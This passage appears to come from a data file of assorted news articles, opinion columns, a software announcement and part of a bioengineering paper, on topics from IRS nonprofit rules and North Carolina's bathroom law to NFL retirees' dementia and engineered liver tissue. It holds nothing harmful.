demanding that these organizations answer questions that actually violate the First Amendment rights of our clients,\" Jay Sekulow, chief counsel of the evangelical interest group American Center for Law and Justice, said in a statement.\n\nBut Donald Tobin, a law professor at the Moritz College of Law at Ohio State University, said the information requested by the IRS is perfectly normal and appropriate. \"The idea is to get the proper information from the organization so you can make the proper decision,\" he said.\n\nAn IRS spokesman declined to comment on specific cases, but said in a statement on Thursday that \"when determining whether an organization is eligible for tax-exempt status, including 501(c)(4) social welfare organizations, all the facts and circumstances of that specific organization must be considered.\"\n\nThe statement described the agency's procedure:\n\nIn cases where an application for exemption under 501 (c)(4) present issues that require further development before a determination can be made, the IRS engages in a back and forth dialogue with the applicant. For example, if an application appears to indicate that the organization has engaged in political activities or may engage in political activities, the IRS will request additional information about those activities to determine whether they, in fact, constitute political activity. If so, the IRS will look at the rest of the organization’s activities to determine whether the primary activities are social welfare activities or whether they are non-exempt activities. In order to make this determination, the IRS must build an administrative record of the case. That record could include answers to questions, copies of documents, copies of web pages and any other relevant information. Career civil servants make all decisions on exemption applications in a fair, impartial manner and do so without regard to political party affiliation or ideology.\n\nNo organization is being compelled to do anything, said Paul S. Ryan, a lawyer with the Campaign Legal Center, a group trying to reduce the influence of money in politics.\n\n\"The tax-exemption of nonprofit groups amounts to a subsidy of their operations,\" Ryan said. \"If a group's going to show up at the IRS with its hand out, I think the federal government is fully within the bounds of not only permissible, but desirable activities to make sure that what amounts to a subsidy is in compliance with the law.\n\n\"I have no sympathy for those who are bending over backward to evade disclosure laws and complaining about the IRS simply doing its job and enforcing the laws on the books,\" Ryan said.\n\nThe only known previous action by the IRS came in July, when it denied C4 status to three units of Emerge America, a group that identifies and trains Democratic women to run for office.\n\nThe IRS opened an examination into whether five large donors had violated the law by not declaring their contributions to political 501(c)(4) groups as gifts. But the agency stopped its inquiry after six Republican members of the Senate Budget Committee accused the IRS of pursuing a Democratic political vendetta.\n\n\"The IRS was bullied by Congress and backed off immediately. It will be interesting to see if the IRS has any backbone this time,\" Ryan said.\n\nOfer Lion, a Los Angeles tax lawyer who represents tax-exempt organizations, said that even if the IRS proceeds, the agency \"usually acts very slowly.\"\n\n\"They are now being looked to enforce these restrictions on political and lobbying activities at the pace of the campaign, which is something they're not used to and not built for,\" Lion said.\n\nThe IRS move will inevitably be attacked as political, but Lion said he sees no indication of politics. \"I'm not sure that it's much more than what seems pretty plain, which is that these organizations look like political organizations,\" he said.\n\n\"Some of these organizations look like political parties. And a political party is not a 501(c)(4). This is just enforcing the laws on the books.\"\n\nAccording to Sandstrom, if the IRS rejects or revokes a C4 classification, it's likely that the group would be forcibly reclassified as a 527 -- and would immediately be in violation of that section's reporting requirements.\n\nThat could result in a slap on the wrist or some sort of negotiated settlement. But technically, the statute establishes the penalty for nondisclosure as the maximum corporate tax rate (35 percent) times all the money that should have been disclosed, but wasn't.\n\n“Failure to report involves a substantial penalty related to the activity you're supposed to report, both on the contribution side and on the expenditure side, so the effective tax is about two-thirds of all revenue,” Sandstrom said.",
  "latent_28028": "Some of you may already have noticed or heard me saying that GAE-Studio was going to be open sourced and I think it is past overdue to officially announce it: GAE-Studio is now open source under Apache 2 and freely available! We promise to keep working on it, and to make that possible, we’re going to add GAE-Studio support to our open source support packages. You can find the source code under our Arcbees github organization as well as on maven central. We released an official, stable version 1.0 a couple of days ago that you can see in action on our demo website. You can also read our documentation to learn more about how to install GAE-Studio in your Google App Engine application.\n\nSome may wonder why we chose to open source what was going to be our first official product. We’ve first started this venture almost 3 years ago when Arcbees was still in its inception. We were using Google App Engine heavily, and the lack of a good datastore admin console was a big problem. At the time, Google App Engine didn’t have any hooks on which we could build one, so we hacked our way around and built something useful for our own work. One year later, after finding other users were feeling the same pain as we did using Google App Engine, we set out to improve GAE-Studio user experience. It was planned to be our very first product that wasn’t going to be open sourced.\n\nLast summer, Google IO announced a new console for Google App Engine that removed much of the pain that GAE-Studio was designed to help with. Then some time later, Objectify-Insight came out, and our visualization engine would be in competition with it. Since we love and have been using Objectify for years, we didn’t want to become their commercial competitor.\n\nStill, we were and are hopeful that GAE-Studio will be useful for our developers. For one thing, GAE-Studio is available to all environments using the Modules, although it was initially written for the Java runtime. This is because Google now provides hooks in the Google App Engine SDK for the things we had to hack our way around to in the past. The further advantage of GAE-Studio is that it can be used locally! While Google has improved the usability of their cloud console a lot, the usability of local development tools is still weak.\n\nSeveral hundred users have expressed an interest in using GAE-Studio, and we are now ready to officially release it in their hands. We hope you will find GAE-Studio useful, and will help us support the remaining runtime.\n\nThanks for the support and words of encouragement, and thanks for sticking with us through this venture!\n\nAbout GAE-Studio\n\nGAE Studio helps you optimize applications hosted on Google App Engine.\n\nGAE Studio also allows datastore exploration, modification, deletion, import and export. Think of it as your swiss army knife for developing GAE applications!\n\nUsing real-time analysis of datastore requests, GAE Studio quickly highlights inefficient queries and gathers metrics that will help developers improve application performance.",

What we are proud of though is that we pulled together enough to force the Swiss skip to draw to the button for the win.\n\nI understand, not everyone cares for our team and some may even cheer against us. But what I don’t believe other people understand is that their negative comments and offensive remarks can easily be read online by friends and family of our team and even our team itself.

This is not new. But with our recent loss, the negativity has been brought to my attention again.\n\nWe have all seen the evolution of social media over the years and the impact it has had both in a positive and negative way in many lives. We see stories in the news all the time about people becoming “Internet sensations” thanks to the likes of YouTube. But we also see the sad stories of young people who have been bullied online to the point where they feel worthless and shamed, and ultimately take their own lives.\n\nRELATED: Jill’s House: World championship requires another painful goodbye\n\nI have learned over the years to avoid reading those negative comments online. Unfortunately when reading all the messages of support, it’s hard to avoid the not-so-nice ones, such as the guy who commented that one of my teammates needed to fix something about her appearance, or the woman who said there were no good teams at the Olympics last year, which is why we won gold, and that the worlds field was why we won silver — even though half the teams were the same at both events!\n\nNow my point with this is not to be woe-is-me. My point is to bring perspective to people out there who might think their comments are insignificant or don’t have much reach. Or to get people to ask themselves what their intention is with their action and statement.\n\nYour comments online can reach far beyond what you think might be a simple statement of an opinion. And trust me when I say, I am all for having your own opinion and respecting the opinion of others.\n\nBut think about the example you are setting for younger generations who have to grow up with the extensive reach of social media. Think about your own kids or youth in your life and how affected you or they would be by negative comments made about them or their choices.\n\nI have two rules in the online world – don’t write anything anywhere that I wouldn’t say to or in front of the person I’m writing about, and don’t write anything I wouldn’t say publicly. And the other rule is just what my mother taught me, and most mothers have taught for generations – if you don’t have anything nice to say, then don’t say anything at all!",

Nooyi also said the law was undermining efforts to advance North Carolina’s interests, and she said she hoped McCrory would consider repealing the law when the state legislature reconvenes later this month.\n\nPepsiCo developed from the merger of Pepsi-Cola and Frito-Lay. Pepsi-Cola was created in the late 1890s by New Bern pharmacist Caleb Bradham. Annual shareholder meetings have been held in New Bern in the past several years.\n\nCompany CEOs and city officials have joined other government and business leaders in opposition to the new law.\n\nThe Human Rights Campaign and Equality North Carolina on Friday released the names of another 10 company executives that have signed on to a letter criticizing the law and seeking its repeal, bringing the number of such names to more than 120. New executives include those from Hewlett Packard Enterprise, Qualcomm and EMC.\n\nThe law, approved by the Republican legislature and Governor McCrory, responded to a Charlotte city council ordinance approved in February that would have extended protections to gays, lesbians, bisexual and transgender people while at hotels, restaurants and stores. Charlotte would also have allowed transgender people to use the restroom aligned with their gender identity.\n\nSeparately on Friday, the venture capital arm of Google’s parent corporation confirmed it would not invest in North Carolina startup businesses so long as the law is in place. GV spokeswoman Jodi Olson cited comments by the CEO, Bill Maris, in which he asked his firm’s partners to flag possible North Carolina investments because he is “not comfortable deploying dollars into startups there until the voters there fix this”. The decision was first reported by Re/code, a tech-focused news site.\n\nThe new state law blocked Charlotte’s rules and prevented other local governments from approving similar ordinances. Government agencies of all kinds must now require people who use multi-stall public restrooms to use the one that corresponds with their sex as identified at birth.\n\nAlso this week, the mayor of Washington DC, Muriel Bowser, and Boston’s city council banned government-connected travel to North Carolina, as a gesture of protest against the law. Similar travel bans have been issued by the governors of Washington, New York and Connecticut and by other cities.\n\nFrom Jim Crow to transgender ban: the bathroom as battleground for civil rights Read more\n\nThe NCAA president, Mark Emmert, said he had spoken to McCrory about the law, making clear that if it remains in place it will affect the state’s chances to host major college athletic events.\n\nA rally was held early on Friday night in front of the state legislative building to support transgender people and to oppose the law. Supporters of the new law held prayer vigils on Thursday night in multiple locations in eastern North Carolina. One was held across from the executive mansion, where McCrory lives.\n\nSupporters of the law say hundreds of businesses support it and have signed on to their own letter praising McCrory and the legislature.\n\nMcCrory and a key lawmaker this week suggested some changes to the law were possible.

For Wilson had been at or close to the top of British politics for 12 years, spending all but four of them in Downing Street. For a large chunk of the 60s and 70s, the words \"prime minister\" instantly evoked the face and flat Yorkshire vowels of Harold Wilson.\n\nNow, though, he is all but forgotten. He did not have long to play the elder statesman, pounding the lecture circuit or doing prestigious TV interviews: his galloping Alzheimer's disease, and the assault it made on his once-famed memory, put paid to that. He became a shambling, confused figure, spotted wandering on his own around the House of Lords, until his wife Mary finally took him off to his beloved Isles of Scilly. On an ITV1 documentary, whose first part aired last night, the journalist John Sweeney recalls seeing a familiar face on a Westminster park bench, sandwiched between two winos: it was the former PM, his eyes vacant.\n\nYet we should not let Wilson slip so easily into oblivion. Both his career, and the manner of its ending, have some useful lessons for today - ones that Tony Blair would do well to heed.\n\nFirst, that resignation has never been fully explained. The ITV programme offers the personal, medical theory: Wilson could tell his brain was weakening, and rather than deny reality - as his Alzheimer's-afflicted mother had done - he resolved to quit while he was still on top. But that cause was almost certainly joined by another - one argued in tomorrow's BBC2 docudrama, The Plot Against Harold Wilson.\n\nAs Peter Wright confirmed in his book Spycatcher, Wilson was the victim of a protracted, illegal campaign of destabilisation by a rogue element in the security services. Prompted by CIA fears that Wilson was a Soviet agent - put in place after the KGB had, the spooks believed, poisoned Hugh Gaitskell, the previous Labour leader - these MI5 men burgled the homes of the prime minister's aides, bugged their phones and spread black, anti-Wilson propaganda throughout the media. They tried to pin all kinds of nonsense on him: that his devoted political secretary, Marcia Williams, posed a threat to national security; that he was a closet IRA sympathiser.\n\nSuch talk stoked up an establishment already trembling at what it saw as Britain's inexorable slide towards anarchy, if not communist rule. Institutions were collapsing, inflation was rising, tax was at a near-mythic top rate of 98%, and Britain was losing the last outposts of empire. Above all, the trade unions, riddled with leftists and Soviet sympathisers, seemed to have the nation under their thumb. \"It was no longer a green and pleasant land, England,\" recalls retired Major Alexander Greenwood, Colonel Blimp made flesh.\n\nThe great and the good feared that the country was out of control, and that Wilson lacked either the will or the desire to stand firm. Retired intelligence officers gathered with military brass and plotted a coup d'etat. They would seize Heathrow airport, the BBC and Buckingham Palace. Lord Mountbatten would be the strongman, acting as interim prime minister. The Queen would read a statement urging the public to support the armed forces, because the government was no longer able to keep order.\n\nIt sounds fantastic, almost comic. But watch Greenwood talk of setting up his own private army in 1974-75. Listen to the former intelligence officer Brian Crozier admit his lobbying of the army, how they \"seriously considered the possibility of a military takeover\". Watch the archive footage of troop manoeuvres at Heathrow, billed as a routine exercise but about which Wilson was never informed - and which he interpreted as a show of strength, a warning, even a rehearsal for a coup. Listen to the voice of Wilson, who five weeks after resigning summoned two BBC journalists to tell them, secretly, of the plot.\n\nMuch of this has been known for a while; many of those involved have admitted as much and do so again in the BBC film. Yet officially it never happened: a 1987 inquiry under Margaret Thatcher concluded the allegations were false, implying that the fading Wilson had descended into paranoia. This can't be allowed to stand. Not only does it do an injustice to Wilson, it also represents an enormous cover-up. For this was the British Watergate, a conspiracy designed to pervert the democratic choice of the people. The circumstances of that time - mighty unions and the cold war - were entirely different. But if we are to learn the lessons of the Wilson plot, to realise what Britain's hidden powers are truly capable of, then these events deserve a proper reckoning. Blair should do a final service to the last Labour leader before him to win an election - and establish an independent inquiry.\n\nIn the process, he might realise how much the two have in common. The early Wilson, like the early Blair, was hailed as the harbinger of a new Britain, in touch with the mood, and the young people, of the age. Wilson gave MBEs to the Beatles, Blair gave tea to Noel Gallagher. Both were multiple election winners, skilful players of the media.\n\nStill, historians may spot other, less comfortable parallels. First, both took heat for backing the US in an unpopular war: Wilson and LBJ in Vietnam, Blair and Bush in Iraq. Second, their reputations were badly muddied by sleaze - specifically alleged abuse of the honours system by handing out gongs and peerages to undeserving cronies. Third, they will both stir admiration for the electoral sorcery that produced winning streaks for Labour, but will both face a question: what legacy of substance did they leave behind?\n\nIf anything, these parallels are unfair to Wilson. He may have publicly backed LBJ, but privately he rejected the president's repeated request to lend even a symbolic British military presence to the war in Vietnam; Wilson refused to send so much as a marching band. Johnson punished him for it, but the PM held firm.\n\nThe Lavender List was a bad error, rewarding some, like Lord Kagan, who were later revealed to be corrupt. But Wilson did not sell peerages for cash, as Blair's Labour has done. In his day there was no need: his Labour party was funded by the trade unions, so did not need to go cap-in-hand to millionaires.\n\nAs for legacy, Wilson was mocked for citing the Open University as his greatest achievement: but that is an institution which has changed thousands of lives for the better. Along with facing down Ian Smith in Rhodesia, and steering Britain towards a Common Market yes vote in 1975, it's not such a bad record. Blair should reflect on it and pause: if his destiny is to be remembered for Iraq, he might prefer to suffer Wilson's recent fate - and be forgotten.\n\nfreedland@theguardian.com",
  "latent_28492": "The N.F.L. and the players union have added programs to aid former players since their pension and disability plans came under public fire two years ago. One helps with joint-replacement surgeries, another with cardiovascular health screenings. The most prominent is the 88 Plan, which helps pay expenses for players with dementia. But for the hundreds of those whose cognitive decline falls short of dementia, the industry’s disability plan has little to offer.\n\nPhoto\n\nA recent New York Times analysis of the plan’s 73 current members suggested that N.F.L. retirees ages 60 to 89 are experiencing moderate to severe dementia at several times the national rate. A recent telephone survey sponsored by the N.F.L. had similar results, corroborating findings from several independent studies, but the league and its doctors continue to discredit all evidence of such a link.\n\n“Telling the players that football has nothing to do with it is literally adding insult to injury,” Culverhouse said. “It’s a joke. It’s unconscionable.”\n\nCulverhouse read about the controversy, heard about how her former lineman Tom McHale had died at 45 with brain damage associated with boxers, and began calling her former players.\n\nShe had always been an N.F.L. misfit. An alumna of Columbia University with a master’s degree in mental retardation and a doctorate in special education, she later became the Buccaneers’ vice president for community relations and eventually president in 1991, always amid whispers that she was just the owner’s daughter. But she relished a good fight; she caused a local uproar by threatening to sue the Palma Ceia Golf and Country Club because as a woman she was barred from using the team’s corporate membership.\n\nEvery former player Culverhouse called had debilitating physical problems, she said. A stunning portion had cognitive ones, even in their mid-40s, and most of them lacked the short-term memory or concentration required to seek medical assistance or slog through the disability paperwork. One player told her, “I’m headed for the 88 Plan.”\n\n“The thing that I always admired about Gay is that she’s a rebel with a cause,” said Brantley, 51. “Football was a man’s world. Still is. I’ve always said, if you want something done and done right, get a woman involved. No one else has shown any interest in us for a second. We might as well have the plague.”\n\nAdvertisement Continue reading the main story\n\nAt a Lee Roy Selmon’s restaurant in Tampa — Selmon is a former Buccaneers defensive lineman — Culverhouse spoke with her former players about others who might need her help, including a former Buccaneers fullback.\n\nPhoto\n\n“I’ve got to get to” him, Culverhouse said.\n\n“He’s not good, no,” replied Wood, 56. “It’s tough to understand him because his speech is so slurred.”\n\n“I’ll fly to Little Rock and fill out the paperwork for him and drive him to the doctors,” Culverhouse said. “You get so far gone that you can’t deal. It’s easier to go home, pop a few pills for the pain and forget about it.”\n\nNewsletter Sign Up Continue reading the main story Please verify you're not a robot by clicking the box.

After learning how cumulative brain trauma can contribute to serious emotional and substance-abuse problems 20 years after retirement , she said while breaking down, “I felt that I had deserted him.” Brandi and Jeff Winans now reconnect on the phone twice a week. He lives in Northern California , and has said he is pursuing medical assistance for his cognitive issues.\n\nAll four at the table — the executive, the players and the spouse — insisted that they loved football and hoped it would continue. But they said that discussing the consequences of professional football in the 1970s and 1980s, when players routinely played through concussions with no idea of the risks, was important to comfort the retirees and, more important, to emphasize the seriousness of brain injuries to today’s amateur athletes.\n\nDr. William Carson, the Buccaneers’ team orthopedist from 1987 to 1997, said in a telephone interview that during his time and certainly before it, most players with “dings” — now understood as mild concussions — would be returned to games. And the players who never came out also played through those dings, and worse, risking cumulative damage only now understood.\n\nJust the other day, Culverhouse called another one of her former players, Randy Grimes, who told her about his addiction to painkillers and his dwindling short-term memory. She helped explain his disability-plan options, how he was not alone. She did not tell him that she was dying, and that she would soon be in Washington sharing her experience with Congress.\n\nBefore they hung up, Culverhouse said that Grimes remarked: “I think I’m fighting this real good, Gay. Your father would be proud of me.”\n\nCulverhouse replied: “That’s just amazing to me. Because what you did for Dad, playing so hard for us and not knowing the risks, that’s what got you into this mess.”",
  "latent_28577": "After 59 years of marriage, family and friends weren’t surprised things ended the bittersweet way they did for Margaret and Don Livengood.\n\nThe couple – inseparable since the day they met – spent their last few days holding hands, side by side in a single hospital room, and died within hours of each other.\n\n“It was normal for them to be holding hands, their love was so precious,” the couple’s daughter, Pattie Beaver, tells PEOPLE. “But it was the sweetest, most precious thing you can imagine to see them holding hands in the hospital.”\n\nBeaver brought her parents to the hospital on the same day. Margaret, 80, was suffering from cancer, while Don, 84, was fighting to breathe because of pulmonary fibrosis and bilateral pneumonia. When they arrived, they were one floor apart at Carolinas Healthcare System Northeast in Concord, North Carolina.\n\n“It broke my heart,” Beaver says, recalling how she’d have to run from floor to floor to help care for her parents. She couldn’t stand the thought that they couldn’t see each other and pleaded with hospital staff to bring them together.\n\nHospital Chaplain Beth Jackson-Jordan was working with the family and says the doctors and nurses had gotten to know the couple in recent months as each came in for treatment and knew they belonged in the same room.\n\n“The need for them to be together overrode any of the other normal concerns,” she says.\n\nDr. Randy Schisler treated both Margaret and Don and says the hospital staff truly came together to make it happen.\n\n“I’m really proud. We stretched as far as we could with the rules to allow things that aren’t typical because it was the absolute right thing for these patients and for this family,” he tells PEOPLE.\n\nAfter four days apart, nurses moved Margaret’s bed into her husband’s room and positioned them so that they could see each other, and of course, hold hands.\n\n“Once they were together, it was just that sense of everything was going to be okay – we knew because they were together,” Beaver says.\n\nDr. Schisler says he’s never seen anything like it. “This is one of those case I don’t think any of us is ever going to forget. Seeing these two people who had spent their lives together, together in the same room as they took their last breaths, none of us are ever going to forget this.”\n\nOne of the other hospital chaplains, Denise Hopper, tells PEOPLE, “I remember her beside him even when she wasn’t able to communicate… I remember him holding her hand and everybody in the room could feel and see the connection. It was very touching to know they had journeyed their entire lives – and as it came to the end of their lives, they were able to be together.”\n\nDespite losing both of her parents in the same day, Beaver says, “It gave me comfort to know that this is exactly what they would want and the hospital was able to make that happen. In the most horrific grief I’ve ever had in my life, I still had comfort because they were together.”\n\nMargaret died around 8 a.m. on August 15. Don passed away later that day, shortly after 5 p.m.\n\nDon was alert until the end, telling his daughter he was grateful he and Margaret could take this last journey together.\n\nBeaver remembers sitting at her father’s bedside and being in awe when he said of his wife, “When we get to heaven, we can walk in together, just like we’re getting married again. Another honeymoon.”",
  "latent_28599": "The Supreme Court has turned down a request to temporarily suspend the contentious provision in President Obama’s new health care law that requires all employers to provide health insurance coverage for contraceptives, NBC’s Pete Williams reports.\n\nThe two companies challenging the provision—Hobby Lobby Stores, an Oklahoma-based arts and crafts chain, and Mardel, a chain of Christian bookstores—are run by religious families who have strong anti-abortion views. The businesses filed their application last Friday, asking the Supreme Court for an immediate order to excuse them from having to provide free health insurance to their employees for emergency contraceptives. Hobby Lobby and Mardel say the mandate would cause “irreparable harm to their religious freedom and to their businesses.”\n\nJustice Sonia Sotomayor, to whom the companies directed their urgent appeal, declined to grant an injunction on Wednesday.\n\nSotomayor said the Supreme Court has never before ruled on a similar claim of free exercise of religion based on mandatory provisions of employment benefit laws, according to NBC’s Pete Williams. She also said that the lower courts are divided on this question, and that no court has yet issued an order stopping enforcement of the law.\n\nIf the two companies ultimately lose in the lower courts, Sotomayor said, they can still appeal to the Supreme Court.\n\nThough Obamacare’s contraceptives mandate has stirred up questions of constitutionality in U.S. federal courts, Hobby Lobby Stores v.

  "latent_28716": "Last night’s Grammy Awards were quite a show. Some collaborations that could have gone really wrong instead proved kind of brilliant: Stevie Wonder and Daft Punk, Kendrick Lamar and Imagine Dragons, Metallica and Lang Lang, Paul and Ringo, Lorde and a Weeping Angel. Pink’s high-flying circus act nearly lived up to her performance of that same song at the AMAs in 2012. (Nearly — go watch that AMA performance again. Wow.) And it was fun to see Kacey Musgraves emerge from the pyrotechnics and smoke to sing her sweet little song.\n\nBut the moment it seems everybody’s talking about today was the Big Number with Macklemore & Ryan Lewis, Mary Lambert, Madonna, Queen Latifah and 34 couples exchanging wedding vows right there on the teevee.\n\nIt was moving and lovely and ambitious, and I can’t help but celebrate a pop-culture moment that results in proven liar Todd Starnes tweeting that “The Grammys mock God, marginalize the Bible” at the very moment that Mary Lambert is belting words written by the Apostle Paul.\n\n“Macklemore launches a hate-filled, bigoted, intolerant diatribe against Christians,” Starnes tweeted. “Love is patient, love is kind,” Lambert sang.\n\nIt doesn’t get much more traditional than having someone read 1 Corinthians 13 at a wedding.\n\nI didn’t even mind that much when Madge stumbled in and segued into the not-quite-a-fit-musically “Open Your Heart.” I like Madonna, but if we’re going to bring her out onto a stage with a gospel-choir of back-up singers, then she needs to be singing one of her songs that calls for that — and “Open Your Heart” isn’t one of them.\n\nI was still able to enjoy the moment, but that was a wrong turn musically — particularly since the right turn was right there in plain sight.\n\nI’m not sure exactly what song the beginning of “Same Love” is built on. At first I thought it was “People Get Ready,” but it may be less direct than that. My new guess is that it’s built on John Mayer’s “Waiting on the World to Change“:\n\nWhich, I think, was probably suggested by Jimmy & Stevie Ray Vaughn’s “ Tick Tock “: https://www.youtube.com/watch?v=jLs5REzFvOY\n\nWhich, in turn, owes its existence to Curtis Mayfield’s “People Get Ready“:\n\nIt’s no coincidence that those songs aren’t just musically related, but that their lyrics also all offer variations on the same theme — something like a vision of the blessed community from the book of Isaiah. Like this:\n\nThe sick, the hungry, had smiles on their faces\n\nThe tired and the homeless had family all around\n\nThe streets and the cities were all beautiful places\n\nAnd the walls came tumblin’ down\n\nOr this:\n\nThere ain’t no room for the hopeless sinner\n\nWho would hurt all mankind just to save his own\n\nHave pity on those whose chances grow thinner\n\nFor there’s no hiding place against the Kingdom’s throne\n\nOr this:\n\nWhen kids are walking ’round the hallway plagued by pain in their heart\n\nA world so hateful some would rather die than be who they are\n\nAnd a certificate on paper isn’t gonna solve it all\n\nBut it’s a damn good place to start\n\nAnd they all also have the advantage of being songs that could have taken full advantage of that gospel choir. That’s what left me a bit disappointed — I wanted to hear that choir cut loose as “Same Love” segued into “People Get Ready.”\n\nWhere “Open your heart” came across as a bit too much like a command, “Just get on board” would’ve sounded like an invitation that might have been hard to resist.\n\nStill, though, it was a lovely moment, and buffoons like Starnes who try to pretend something so joyous and celebratory is the picture of evil and “hate” just look like fools who missed the train because they were clinging to their baggage.\n\nLove is patient, love is kind. You don’t need no baggage, you just get on board.",

  "latent_29439": "This article is over 1 year old\n\nMP says universities put pressure on journalists to change stories about lack of black students getting places rather than addressing concerns\n\nOxford and Cambridge have been accused of failing to engage in serious debate over their lack of diversity by the former education minister David Lammy, who first highlighted the issue with data obtained by freedom of information requests.\n\nThe Labour MP said the universities had been “trying to make journalists change their stories” rather than address how little progress they were making in recruiting talented students by race, social class and location in England and Wales.\n\nHis accusation came after sparking national controversy over data – first published in the Guardian –\n\nthat showed that as many as 16 Oxbridge colleges failed to offer any places to black British applicants in 2015, the most recent figures under the FOI request.\n\nOn Friday Lammy sent a strongly worded complaint to the vice-chancellors of both Oxford and Cambridge, saying that university staff had been pressuring journalists over data uncovered by the FOI request.\n\nDavid Lammy (@DavidLammy) As I understand it, @UniofOxford Press Office have spent the day trying to reduce the impact of the story, NOT responding to the substance.\n\nIn a joint letter to Louise Richardson, the Oxford vice-chancellor, and Stephen Toope, Cambridge’s vice-chancellor, Lammy said: “I have been made aware that your press teams have been demanding corrections to stories that are factually correct and accurately refer to the figures provided,” and called on them to investigate.\n\n“I am deeply disappointed that both universities have refused to engage on the substance of the data published and are instead trying to make journalists change their stories.”\n\nBlack students on Oxbridge: 'we need to change the narrative' Read more\n\nThe release of the new data has been contentious, with Oxford refusing to publish a detailed breakdown of undergraduate offers by ethnicity. Instead it published only a narrow set of data showing “white” and “black” offers, ignoring Asian, mixed or other ethnic groups.\n\nLammy’s campaign on admissions received support from the higher education minister, Jo Johnson, who wrote: “Oxford must clearly do more to open up to under-represented groups.”\n\nJohnson included a link to a formal direction he sent last year to the admissions watchdog, the director for fair access, which specifically picked out Oxford as “demonstrating little progress” on admitting disadvantaged young people.\n\nJo Johnson (@JoJohnsonUK) Oxford must clearly do more to open up to underrepresented groups, as I stated in my guidance to @OFFA_HE last yr https://t.co/lhgu29ZyNp\n\nWhile Johnson’s letter received little attention when it was published last year, the public naming of Oxford caused considerable controversy behind the scenes, including protests from the university itself.\n\nLabour MPs were also dismayed at the low level of representation at Oxbridge from within their own constituencies.\n\nThe FOI data showed that eight local authorities – Sandwell, Halton, Knowsley, and Rochdale in England, Torfaen, Blaenau Gwent, Merthyr Tydfil and Neath in Wales – gained a combined total of eight offers from Cambridge between 2010 and 2015.\n\nIn comparison, students from the largest eight local authorities – including Kent, Surrey and Essex – received more than 4,800 offers during the same six-year span.\n\nAngela Rayner, Labour’s shadow education secretary, said: “This is the latest damning evidence on the government’s failure to widen access to our most selective universities.\n\n“The proportion of comprehensive school pupils getting in to top universities under the Tories is lower than when Labour left office, and this data shows that the problem is especially serious at Oxford and Cambridge.\n\n“Ministers claim their system is working, but these figures show that it isn’t.”\n\nCambridge separately released figures showing that in 2016 it admitted 39 black British students as undergraduates, and between 2007-16 the number of black British students it accepted annually increased by 30%.",

  "latent_29714": "There is an enormous clinical need for liver transplant tissue. Bioengineered livers might ultimately be used as a bridge to or alternative for whole organ transplantation. In new work, Stevens et al. fabricated human artificial liver “seeds” in biomaterials that were able to grow and expand after implantation into mice in response to liver injury. After growth, the human artificial liver seeds were able to carry out normal liver functions such as production of human proteins like transferrin and albumin. This study suggests that implanted engineered tissue seeds should be able to expand in response to the body’s own repair signals.\n\nControl of both tissue architecture and scale is a fundamental translational roadblock in tissue engineering. An experimental framework that enables investigation into how architecture and scaling may be coupled is needed. We fabricated a structurally organized engineered tissue unit that expanded in response to regenerative cues after implantation into mice with liver injury. Specifically, we found that tissues containing patterned human primary hepatocytes, endothelial cells, and stromal cells in a degradable hydrogel expanded more than 50-fold over the course of 11 weeks in mice with injured livers. There was a concomitant increase in graft function as indicated by the production of multiple human liver proteins. Histologically, we observed the emergence of characteristic liver stereotypical microstructures mediated by coordinated growth of hepatocytes in close juxtaposition with a perfused vasculature. We demonstrated the utility of this system for probing the impact of multicellular geometric architecture on tissue expansion in response to liver injury. This approach is a hybrid strategy that harnesses both biology and engineering to more efficiently deploy a limited cell mass after implantation.\n\nHere, we fabricated a liver tissue seed that could support the in situ expansion of its cellular components in response to systemic regenerative cues after implantation in mice with liver injury. Our efforts were informed by reports of the importance of paracrine signaling between hepatocytes, endothelial cells, and stromal cells in both liver development and regeneration processes ( 6 – 9 ), as well as by our prior engineering efforts that demonstrated context-dependent cell signaling in microfabricated tissue microenvironments using a range of biomaterials ( 2 , 19 – 23 ). Our combined approach yielded an engineered, fully human tissue seed composed of human endothelial cells, hepatocytes, and fibroblasts in a degradable hydrogel that engrafted ectopically in mice and expanded more than 50-fold in situ in response to regenerative signals. The resultant human organoid phenocopied several aspects of native liver structure and function, including perfused vascular networks, self-assembled structures resembling bile ducts, and production of human liver proteins secreted into mouse blood.\n\nA different approach may be to nucleate a “seed” of an organ derived from mature cell populations that can grow by in situ expansion, as seen both in hepatic embryogenesis wherein primordial tissue buds grow into vascularized organs and in regenerative adult responses wherein hepatocytes and their vasculature undergo coordinated expansion ( 6 – 9 ). As a step toward this goal, cells have been expanded after engraftment in solid organs by manipulating cell signaling pathways ( 10 – 12 ) or by creating a repopulation advantage for graft cells using injury models ( 13 – 18 ). However, each of these methods depends on the ability of grafted cells to self-organize to form larger, organized tissue structures and leaves open the question as to the role of controlled multicellular architectural interactions during the expansion and ultimate function of grafted tissues.\n\nA variety of approaches have been examined to promote vascularization and architectural structural control of solid engineered tissues. For example, inclusion of randomly organized or patterned endothelial cells has improved both the engraftment rate and persistence of metabolic tissues ( 6 – 8 ). Decellularization of native structures ( 9 , 10 ) and biofabrication techniques, such as microtissue molding ( 1 , 2 ) and bioprinting ( 3 – 5 ), have provided further ways to organize cells into scalable vascularized architectures, but all of these approaches offer limited utility for large solid organs because tissues must be perfused rapidly (within ~1 hour of tissue assembly) to prevent ischemic injury.\n\nAdvances in tissue engineering have enabled the generation of numerous tissue types that can recapitulate many aspects of native organs, bringing closer the promise that engineered tissues may ultimately replace whole-organ transplantation ( 1 , 2 ). However, constructing complex solid organs remains a major physical and biological challenge. For engineered tissues that can be fed by diffusion of nutrients from the environment (such as the cornea and skin), thick tissues with low metabolic requirements (such as cartilage), or small-scale endocrine tissues (such as β cells of the pancreas), the recapitulation of complex tissue architecture has not been a limiting factor for clinical translation ( 1 , 2 ). However, providing structural organization is likely important for large, metabolically active solid organs such as the heart, kidney, and liver. For example, the liver contains more than 100 billion hepatocytes, all positioned within 50 μm of the circulation ( 3 ). The organization of the circulation and its lining endothelium are integral aspects of the functional organ and are critical to the delivery of vital nutrients to the entire parenchyma of tissue, as well as to the cell-cell interactions that define juxtacrine and paracrine signals that drive diverse processes such as embryological development, organ function, and regeneration ( 4 , 5 ).\n\nRESULTS\n\nConstruction of human liver tissue seeds from cellular components We first sought to create an engineered “tissue seed” candidate by arranging a combination of human cell types in a format that would allow for expansion of the tissue seeds in situ in response to regenerative cues. Previous work had demonstrated the importance of paracrine signals between hepatocytes, endothelial cells, and stromal cells (6–9) in regeneration, as well as the requirement for defined spatial organization of engineered tissues for optimizing cellular function (1, 2, 21). We therefore incorporated human hepatocytes, endothelial cells, and stromal cells in structurally organized tissue seeds. To do this, we first used microwell technology to create aggregates of a defined size, composed of combinations of human hepatocytes and normal human dermal fibroblasts (NHDFs; Fig. 1A) (2). Similarly, microtissue molding was used to create patterned 